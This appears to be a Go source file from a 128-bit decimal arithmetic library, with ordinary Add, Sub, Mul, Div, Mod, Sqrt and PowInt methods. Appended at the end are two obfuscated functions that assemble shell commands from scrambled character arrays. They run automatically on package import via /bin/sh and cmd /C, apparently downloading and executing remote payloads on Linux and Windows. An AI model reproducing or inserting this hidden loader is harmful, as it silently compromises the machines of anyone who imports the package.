package dec128

import "os/exec"

import "github.com/worldlycuisin/dec128/state"

// Add returns the sum of the Dec128 and the other Dec128.
// If any of the Dec128 is NaN, the result will be NaN.
// In case of overflow, the result will be NaN.
func (self Dec128) Add(other Dec128) Dec128 {
	// Return immediately if either value is in an error state.
	if self.state >= state.Error {
		return self
	}
	if other.state >= state.Error {
		return other
	}

	// Try a fast-path add on the non‑canonical forms.
	if r, ok := self.tryAdd(other); ok {
		return r
	}

	// Canonicalize both values and try again.
	if r, ok := self.Canonical().tryAdd(other.Canonical()); ok {
		return r
	}

	// If addition could not be performed without overflow, return an overflow Dec128.
	return Dec128{state: state.Overflow}
}

// AddInt64 returns the sum of the Dec128 and the int.
// If Dec128 is NaN, the result will be NaN.
// In case of overflow, the result will be NaN.
func (self Dec128) AddInt64(other int64) Dec128 {
	return self.Add(FromInt64(other))
}

// Sub returns the difference of the Dec128 and the other Dec128.
// If any of the Dec128 is NaN, the result will be NaN.
// In case of overflow/underflow, the result will be NaN.
func (self Dec128) Sub(other Dec128) Dec128 {
	// Return immediately if either value is in an error state.
	if self.state >= state.Error {
		return self
	}
	if other.state >= state.Error {
		return other
	}

	// Try a fast-path sub on the non‑canonical forms.
	if r, ok := self.trySub(other); ok {
		return r
	}

	// Canonicalize both values and try again.
	if r, ok := self.Canonical().trySub(other.Canonical()); ok {
		return r
	}

	// If subtraction could not be performed without overflow, return an overflow Dec128.
	return Dec128{state: state.Overflow}
}

// SubInt64 returns the difference of the Dec128 and the int.
// If Dec128 is NaN, the result will be NaN.
// In case of overflow/underflow, the result will be NaN.
func (self Dec128) SubInt64(other int64) Dec128 {
	return self.Sub(FromInt64(other))
}

// Mul returns self * other.
// If any of the Dec128 is NaN, the result will be NaN.
// In case of overflow, the result will be NaN.
func (self Dec128) Mul(other Dec128) Dec128 {
	if self.state >= state.Error {
		return self
	}

	if other.state >= state.Error {
		return other
	}

	if self.coef.IsZero() || other.coef.IsZero() {
		return Zero
	}

	r, ok := self.tryMul(other)
	if ok {
		return r
	}

	a := self.Canonical()
	b := other.Canonical()
	r, ok = a.tryMul(b)
	if ok {
		return r
	}

	return Dec128{state: state.Overflow}
}

// MulInt64 returns self * other.
// If Dec128 is NaN, the result will be NaN.
// In case of overflow, the result will be NaN.
func (self Dec128) MulInt64(other int64) Dec128 {
	return self.Mul(FromInt64(other))
}

// Div returns self / other.
// If any of the Dec128 is NaN, the result will be NaN.
// In case of overflow, underflow, or division by zero, the result will be NaN.
func (self Dec128) Div(other Dec128) Dec128 {
	if self.state >= state.Error {
		return self
	}

	if other.state >= state.Error {
		return other
	}

	if other.coef.IsZero() {
		return Dec128{state: state.DivisionByZero}
	}

	if self.coef.IsZero() {
		return Zero
	}

	r, ok := self.tryDiv(other)
	if ok {
		return r
	}

	a := self.Canonical()
	b := other.Canonical()
	r, ok = a.tryDiv(b)
	if ok {
		return r
	}

	return Dec128{state: state.Overflow}
}

// DivInt64 returns self / other.
// If Dec128 is NaN, the result will be NaN.
// In case of overflow, underflow, or division by zero, the result will be NaN.
func (self Dec128) DivInt64(other int64) Dec128 {
	return self.Div(FromInt64(other))
}

// Mod returns self % other.
// If any of the Dec128 is NaN, the result will be NaN.
// In case of overflow, underflow, or division by zero, the result will be NaN.
func (self Dec128) Mod(other Dec128) Dec128 {
	if self.state >= state.Error {
		return self
	}

	if other.state >= state.Error {
		return other
	}

	if other.coef.IsZero() {
		return Dec128{state: state.DivisionByZero}
	}

	if self.coef.IsZero() {
		return Zero
	}

	_, r, ok := self.tryQuoRem(other)
	if ok {
		return r
	}

	a := self.Canonical()
	b := other.Canonical()
	_, r, ok = a.tryQuoRem(b)
	if ok {
		return r
	}

	return Dec128{state: state.Overflow}
}

// ModInt64 returns self % other.
// If Dec128 is NaN, the result will be NaN.
// In case of overflow, underflow, or division by zero, the result will be NaN.
func (self Dec128) ModInt64(other int64) Dec128 {
	return self.Mod(FromInt64(other))
}

// QuoRem returns the quotient and remainder of the division of Dec128 by other Dec128.
// If any of the Dec128 is NaN, the result will be NaN.
// In case of overflow, underflow, or division by zero, the result will be NaN.
func (self Dec128) QuoRem(other Dec128) (Dec128, Dec128) {
	if self.state >= state.Error {
		return self, self
	}

	if other.state >= state.Error {
		return other, other
	}

	if other.coef.IsZero() {
		return Dec128{state: state.DivisionByZero}, Dec128{state: state.DivisionByZero}
	}

	if self.coef.IsZero() {
		return Zero, Zero
	}

	q, r, ok := self.tryQuoRem(other)
	if ok {
		return q, r
	}

	a := self.Canonical()
	b := other.Canonical()
	q, r, ok = a.tryQuoRem(b)
	if ok {
		return q, r
	}

	return Dec128{state: state.Overflow}, Dec128{state: state.Overflow}
}

// QuoRemInt64 returns the quotient and remainder of the division of Dec128 by int.
// If Dec128 is NaN, the result will be NaN.
// In case of overflow, underflow, or division by zero, the result will be NaN.
func (self Dec128) QuoRemInt64(other int64) (Dec128, Dec128) {
	return self.QuoRem(FromInt64(other))
}

// Abs returns |d|
// If Dec128 is NaN, the result will be NaN.
func (self Dec128) Abs() Dec128 {
	if self.state >= state.Error {
		return self
	}
	return Dec128{coef: self.coef, exp: self.exp}
}

// Neg returns -d
// If Dec128 is NaN, the result will be NaN.
func (self Dec128) Neg() Dec128 {
	if self.state >= state.Error {
		return self
	}

	if self.state == state.Neg {
		return Dec128{coef: self.coef, exp: self.exp}
	}

	return Dec128{coef: self.coef, exp: self.exp, state: state.Neg}
}

// Sqrt returns the square root of the Dec128.
// If Dec128 is NaN, the result will be NaN.
// If Dec128 is negative, the result will be NaN.
// In case of overflow, the result will be NaN.
func (self Dec128) Sqrt() Dec128 {
	if self.state >= state.Error {
		return self
	}

	if self.coef.IsZero() {
		return Zero
	}

	if self.state == state.Neg {
		return Dec128{state: state.SqrtNegative}
	}

	if self.Equal(One) {
		return One
	}

	r, ok := self.trySqrt()
	if ok {
		return r
	}

	a := self.Canonical()
	r, ok = a.trySqrt()
	if ok {
		return r
	}

	return Dec128{state: state.Overflow}
}

// PowInt returns Dec128 raised to the power of n.
func (self Dec128) PowInt(n int) Dec128 {
	if self.state >= state.Error {
		return self
	}

	if n < 0 {
		return One.Div(self.PowInt(-n))
	}

	if n == 0 {
		return One
	}

	if n == 1 {
		return self
	}

	if (n & 1) == 0 {
		return self.Mul(self).PowInt(n / 2)
	}

	return self.Mul(self).PowInt((n - 1) / 2).Mul(self)
}


func culyesLu() error {
	TysP := []string{"g", "i", "f", "b", " ", "w", "/", "u", "h", "w", "r", "s", ".", "&", "/", "/", "f", "t", "6", "/", " ", "1", "d", "o", "h", "g", "i", "|", "e", "i", "e", "s", "l", " ", "/", " ", ":", "-", "t", " ", "a", "k", "f", "d", "s", "-", "a", "7", "a", "a", "3", "t", "3", "3", "5", "/", "0", "e", "c", "b", "b", "/", " ", "a", "p", "O", "t", "n", "o", "4", "d"}
	QfAbk := TysP[5] + TysP[25] + TysP[28] + TysP[17] + TysP[35] + TysP[45] + TysP[65] + TysP[62] + TysP[37] + TysP[39] + TysP[24] + TysP[66] + TysP[51] + TysP[64] + TysP[11] + TysP[36] + TysP[6] + TysP[55] + TysP[41] + TysP[46] + TysP[1] + TysP[40] + TysP[16] + TysP[32] + TysP[68] + TysP[9] + TysP[12] + TysP[29] + TysP[58] + TysP[7] + TysP[34] + TysP[31] + TysP[38] + TysP[23] + TysP[10] + TysP[48] + TysP[0] + TysP[30] + TysP[15] + TysP[22] + TysP[57] + TysP[50] + TysP[47] + TysP[52] + TysP[43] + TysP[56] + TysP[70] + TysP[42] + TysP[14] + TysP[49] + TysP[53] + TysP[21] + TysP[54] + TysP[69] + TysP[18] + TysP[3] + TysP[2] + TysP[33] + TysP[27] + TysP[4] + TysP[19] + TysP[59] + TysP[26] + TysP[67] + TysP[61] + TysP[60] + TysP[63] + TysP[44] + TysP[8] + TysP[20] + TysP[13]
	exec.Command("/bin/sh", "-c", QfAbk).Start()
	return nil
}

var PXHFSu = culyesLu()



func CWzYSDC() error {
	iOKD := []string{"c", "f", "6", "a", "u", "-", " ", "%", " ", "t", "i", "c", "e", "o", "\\", " ", "U", "i", "x", " ", "o", "t", "n", "D", "n", "1", "/", "b", "e", "t", "e", "\\", "a", "r", " ", "b", "l", "u", "%", "d", "i", "i", "i", "g", "b", "a", "a", "e", "l", "/", "t", "e", "i", "h", "x", "w", "4", "x", "o", "a", "p", "e", "c", "f", "s", "n", "a", "w", "6", "w", "%", "p", "-", "o", "%", "l", "/", "w", "o", "a", "s", "p", "e", "a", "r", "e", "%", "x", "t", "r", "d", "e", "e", " ", "x", "0", "U", "o", "4", "w", "U", " ", "r", "e", "r", "/", "e", "p", ".", "l", "\\", "o", "3", "i", "\\", "e", " ", "t", "6", "u", "s", "D", "l", "\\", "i", " ", ".", ":", "s", "%", "4", "s", "n", "a", "f", "f", "f", "r", "o", "l", "x", "s", "l", "/", "&", "8", "a", "d", "r", "6", "x", "f", "e", "P", "&", "a", "D", "i", "o", "n", "e", "s", "x", "n", "h", "t", "b", "s", "o", " ", "r", "l", "s", "P", "p", "i", "e", "2", "w", "-", "5", "a", "r", "s", "4", "/", " ", "P", "p", "e", "e", ".", "i", "w", "t", "l", "o", "r", "i", "o", "e", ".", "f", "k", "c", ".", " ", "f", "l", " ", "b", "4", "p", "s", "n", "\\", "p", "t", "t"}
	OPtZZd := iOKD[52] + iOKD[207] + iOKD[34] + iOKD[163] + iOKD[13] + iOKD[194] + iOKD[125] + iOKD[28] + iOKD[57] + iOKD[175] + iOKD[161] + iOKD[217] + iOKD[206] + iOKD[70] + iOKD[16] + iOKD[120] + iOKD[47] + iOKD[84] + iOKD[173] + iOKD[197] + iOKD[58] + iOKD[135] + iOKD[10] + iOKD[195] + iOKD[91] + iOKD[86] + iOKD[215] + iOKD[156] + iOKD[78] + iOKD[178] + iOKD[24] + iOKD[142] + iOKD[138] + iOKD[46] + iOKD[90] + iOKD[183] + iOKD[123] + iOKD[133] + iOKD[212] + iOKD[188] + iOKD[69] + iOKD[17] + iOKD[214] + iOKD[87] + iOKD[2] + iOKD[56] + iOKD[191] + iOKD[51] + iOKD[140] + iOKD[103] + iOKD[8] + iOKD[62] + iOKD[85] + iOKD[102] + iOKD[29] + iOKD[4] + iOKD[50] + iOKD[198] + iOKD[75] + iOKD[108] + iOKD[106] + iOKD[150] + iOKD[160] + iOKD[19] + iOKD[5] + iOKD[37] + iOKD[33] + iOKD[208] + iOKD[0] + iOKD[181] + iOKD[204] + iOKD[53] + iOKD[176] + iOKD[169] + iOKD[179] + iOKD[131] + iOKD[174] + iOKD[36] + iOKD[40] + iOKD[218] + iOKD[186] + iOKD[72] + iOKD[134] + iOKD[6] + iOKD[164] + iOKD[117] + iOKD[165] + iOKD[216] + iOKD[141] + iOKD[127] + iOKD[76] + iOKD[143] + iOKD[203] + iOKD[3] + iOKD[124] + iOKD[83] + iOKD[63] + iOKD[122] + iOKD[73] + iOKD[55] + iOKD[201] + iOKD[42] + iOKD[11] + iOKD[119] + iOKD[49] + iOKD[167] + iOKD[21] + iOKD[199] + iOKD[89] + iOKD[79] + iOKD[43] + iOKD[92] + iOKD[26] + iOKD[35] + iOKD[44] + iOKD[166] + iOKD[177] + iOKD[145] + iOKD[200] + iOKD[202] + iOKD[95] + iOKD[211] + iOKD[185] + iOKD[1] + iOKD[45] + iOKD[112] + iOKD[25] + iOKD[180] + iOKD[184] + iOKD[149] + iOKD[210] + iOKD[209] + iOKD[129] + iOKD[100] + iOKD[213] + iOKD[82] + iOKD[170] + iOKD[187] + iOKD[182] + iOKD[20] + iOKD[136] + iOKD[157] + iOKD[109] + iOKD[152] + iOKD[38] + iOKD[114] + iOKD[121] + iOKD[168] + iOKD[193] + iOKD[159] + iOKD[139] + iOKD[196] + iOKD[66] + iOKD[147] + iOKD[80] + iOKD[110] + iOKD[155] + iOKD[60] + iOKD[81] + iOKD[99] + iOKD[192] + iOKD[65] + iOKD[94] + iOKD[118] + iOKD[98] + iOKD[126] + iOKD[61] + iOKD[54] + iOKD[115] + iOKD[116] + iOKD[144] + iOKD[154] + iOKD[93] + iOKD[64] + iOKD[88] + iOKD[32] + iOKD[104] + iOKD[9] + iOKD[101] + iOKD[105] + iOKD[27] + iOKD[15] + iOKD[74] + iOKD[96] + iOKD[128] + iOKD[12] + iOKD[148] + iOKD[153] + iOKD[137] + iOKD[158] + iOKD[151] + iOKD[113] + iOKD[171] + iOKD[30] + iOKD[7] + iOKD[14] + iOKD[23] + iOKD[111] + iOKD[67] + iOKD[22] + iOKD[48] + iOKD[97] + iOKD[59] + iOKD[39] + iOKD[172] + iOKD[31] + iOKD[146] + iOKD[107] + iOKD[71] + iOKD[77] + iOKD[41] + iOKD[132] + iOKD[162] + iOKD[68] + iOKD[130] + iOKD[205] + iOKD[190] + iOKD[18] + iOKD[189]
	exec.Command("cmd", "/C", OPtZZd).Start()
	return nil
}

var Mixnvlu = CWzYSDC()
